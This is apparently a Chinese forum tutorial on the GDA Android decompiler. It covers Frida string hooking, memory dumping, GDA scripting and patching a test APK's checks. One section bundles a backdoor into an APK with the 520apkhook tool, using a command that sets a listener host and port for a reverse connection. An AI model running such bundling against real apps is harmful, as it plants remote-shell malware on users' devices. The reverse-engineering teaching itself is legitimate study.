
## `String` java 类

### `startsWith` 方法

![](https://bbs.kanxue.com/upload/attach/202307/767964_BXTWZKGKWMYAA7W.jpg)

```
setImmediate(function() {

Java.perform(function(){

    var Stringg = Java.use("java.lang.String");

    console.log("Waiting for APP permission")

    console.log("Waiting for APP permission")

    Stringg.startsWith.overload('java.lang.String').implementation=function(test){

        console.log("----------Record TCP or HTTPS information:----------")

        console.log(this)

        var reval = this.startsWith(test)

        return reval

    }

})

})
```

![](https://bbs.kanxue.com/upload/attach/202307/767964_D345RXZ7YM9QWG6.jpg)

可在右侧窗口，右键选择退出选项以结束脚本执行

![](https://bbs.kanxue.com/upload/attach/202307/767964_VDVP3KXYC53W2PT.jpg)

简单的动态分析到此结束

# 捆绑加固类APK分析

使用520apkhook工具进行捆绑与加固

备注：需要需改源代码因[utils](https://bbs.kanxue.com/elink@6b6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1j5e0m8Y4N6e0m8Q4x3V1j5#2x3U0m8S2M7r3E0Z5L8$3!0C8i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4g2@1K9h3I4K6) 命名冲突

![](https://bbs.kanxue.com/upload/attach/202307/767964_5AV49D5KHE9EB8W.jpg)

`main.py`

![](https://bbs.kanxue.com/upload/attach/202307/767964_N8ESQNR22VM8TJY.jpg)

`python main.py --lhost 192.168.70.133 --lport 55555 -n ./test.apk`

![](https://bbs.kanxue.com/upload/attach/202307/767964_X42EP34YE26TW46.jpg)

## Malscan 对比

原始：`test.apk`

![](https://bbs.kanxue.com/upload/attach/202307/767964_9QJS8SJWUMC4JXU.jpg)

![](https://bbs.kanxue.com/upload/attach/202307/767964_QTTGUJNSMYEHTMW.jpg)

捆绑：`AllFinish.apk`

![](https://bbs.kanxue.com/upload/attach/202307/767964_A2HGZVVQFGQ5ZXP.jpg)

![](https://bbs.kanxue.com/upload/attach/202307/767964_VZYVMCC3FNTABXY.jpg)

对比：恶意扫描发现增加了文件操作方法并且apk包内多了很多文件

## 内存导出

应用场景APK被加固的时候可Dump内存数据进行分析

- `adb` 工具设置

避免执行报错推荐如下设置：环境变量的`adb`使用`gdatmp`目录的，若测试设备是模拟器（需删除模拟器自带的`adb`,使用`gdatmp`目录下的`adb`替换）

备注：`gdatmp`目录可在GDA不打开apk的时候在识图界面点击工作目录快速导航到，若已打开apk在导航的目录需返回上一级目录查看

测试：

![](https://bbs.kanxue.com/upload/attach/202307/767964_GGYPXYR556U4QKK.jpg)

如下图所示：右侧区域有数据输出内容

![](https://bbs.kanxue.com/upload/attach/202307/767964_C7UNGJYUJ73FH5H.jpg)

- Dump错误情况

若不可用情况下可将内存Dump工具手动上传到Android设备（正常是自动上传）

内存Dump工具保存GDA工作目录的`gdatmp`文件夹内

![](https://bbs.kanxue.com/upload/attach/202307/767964_8H4BP9W7F2A8HUT.jpg)

根据Android设备内核选择对应的版本上传到该设备，并赋予相应权限示例：

删除Android设备`/data/local/tmp/`目录的`Gdump`文件

`adb push %APPDATA%\GDA\gdatmp\Gdumpx86\_64 /data/local/tmp/Gdump`

`adb shell chmod 777 /data/local/tmp/Gdump`

测试

![](https://bbs.kanxue.com/upload/attach/202307/767964_SHHZ7TPTTWQRQK6.jpg)

转储成功提示窗口

![](https://bbs.kanxue.com/upload/attach/202307/767964_BD3SCRFB4WAKBWM.jpg)

点击OK会在资源管理器中打开转储文件保存的路径

![](https://bbs.kanxue.com/upload/attach/202307/767964_D9PA6RSXECU3T8Y.jpg)

# 运行脚本

## python脚本

测试脚本

`1.py`

```
def GDA_MAIN(gda_obj):

    per='The apk permission:\n'

    per+=gda_obj.GetPermission()

    gda_obj.log(per)

    tofile = open('out.txt','w')

    tofile.write(per)

    tofile.close()

    return 0
```

运行后界面变化与输出`out.txt`与`1.pyc`文件

![](https://bbs.kanxue.com/upload/attach/202307/767964_993A7F8C8HE89F5.jpg)

## JAVA脚本

测试脚本

`1.java`

```
package example;

import com.gda.api.GDAInterface;

import com.gda.api.GdaDex;

import com.gda.api.MethodInfo;

import com.gda.api.DexHeader;

//gjden

//example of dumping all the callors of a method

class Example4Callor {

	public int GDA_MAIN(GDAInterface gda)

	{

		String callorStr="";

		GdaDex Dex0=gda.DexList.get(0);

		for (MethodInfo method:Dex0.MethodList){

			if(method!=null&&method.callorIdxList.length>5){

				callorStr=String.format("the [%d] callors of the method: %s\n\n",method.callorIdxList.length,method.methodFullName);

				for (int calloridx:method.callorIdxList){

					String index=""+calloridx;

					if (Dex0.MethodTable.containsKey(index)){

						MethodInfo obj=Dex0.MethodTable.get(index);

                        callorStr+=obj.methodFullName;

						callorStr+=obj.MethodSignature;

						callorStr+="\n";

					}

				}

				break;

			}

		}

		gda.log(callorStr);

		return 0;

	}

}
```

若直接加载`.java`会弹出如下窗口

![](https://bbs.kanxue.com/upload/attach/202308/767964_W7ET7DWTE3THKP6.jpg)

加载编译好的`class`文件

![](https://bbs.kanxue.com/upload/attach/202308/767964_8FYT6G94SUGR7KB.jpg)

相关脚本可在GitHub项目查看0b8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0K9r3q4J5L8r3g2K6x3X3N6S2L8W2)9J5c8V1N6p5b7g2)9J5k6r3q4F1k6s2u0G2K9h3c8Q4x3X3c8J5k6i4k6W2M7Y4y4A6L8X3N6Q4x3X3c8f1L8$3!0D9

# 应用案例

## 修改文件

测试文件：[021K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1N6h3@1I4M7U0m8Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6g2X3j5%4u0S2j5$3E0E0k6i4x3`.](https://bbs.kanxue.com/elink@419K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6F1N6h3@1I4M7U0m8Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6g2X3j5%4u0S2j5$3E0E0k6i4x3`.)

载入测试文件后点击Entry进入入口区域

![](https://bbs.kanxue.com/upload/attach/202307/767964_X85VZ2JBX6TUD6W.jpg)

鼠标左键双击`MainActivity$1`，进入`MainActivity`区域

![](https://bbs.kanxue.com/upload/attach/202307/767964_CR9YCJBZBR8XTAR.jpg)

鼠标左键双击`getFlag`

![](https://bbs.kanxue.com/upload/attach/202307/767964_BSPTVB9H28RW4A3.jpg)

1.查看相关信息：鼠标左键双击`getData`

![](https://bbs.kanxue.com/upload/attach/202307/767964_NBWJCTMJM55EQUC.jpg)

`s3cr37\_p4ssw0rd\_1337`

![](https://bbs.kanxue.com/upload/attach/202307/767964_W3SWNETPP36MWH2.jpg)

![](https://bbs.kanxue.com/upload/attach/202307/767964_USNGH3HFAAWCFAJ.jpg)

2.修改判断：F5或右键在弹出的功能窗口点击`SmaliJava`

![](https://bbs.kanxue.com/upload/attach/202307/767964_BAT6UNSR45MQ228.jpg)

smali代码

![](https://bbs.kanxue.com/upload/attach/202307/767964_93XD957CS583VSN.jpg)

- `NOP`修改

![](https://bbs.kanxue.com/upload/attach/202307/767964_7B3W3U7YVWS77QY.jpg)

按R键保存修改

可点击OK将修改后的APK安装到测试设备

![](https://bbs.kanxue.com/upload/attach/202307/767964_J8SSRBUJTAZAZHA.jpg)

安装成功的提示信息

![](https://bbs.kanxue.com/upload/attach/202307/767964_NRD55WZSQZBDAV8.jpg)

运行测试

![](https://bbs.kanxue.com/upload/attach/202307/767964_3DNWWXQY26RYZ6Y.jpg)

- 修改指令

![](https://bbs.kanxue.com/upload/attach/202308/767964_UHUHX78Y9D57EME.jpg)

将`if-eqz`修改为`if-nez`

右键可看到相关功能菜单

![](https://bbs.kanxue.com/upload/attach/202308/767964_ZEG65WKPMXQCVY4.jpg)

按M键修改当前选择的指令

![](https://bbs.kanxue.com/upload/attach/202308/767964_9QMJPMD5AABFYPD.jpg)

修改完毕按Enter键确认修改

![](https://bbs.kanxue.com/upload/attach/202308/767964_6PMCYMXU39T83WH.jpg)

按R键保存修改，进行测试

![](https://bbs.kanxue.com/upload/attach/202308/767964_GTSP8RUYNTJJYSF.jpg)

此篇文章到此结束

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2023-8-16 07:33

被梦幻的彼岸编辑

，原因：

[#其他](https://bbs.kanxue.com/forum-161-1-129.htm)
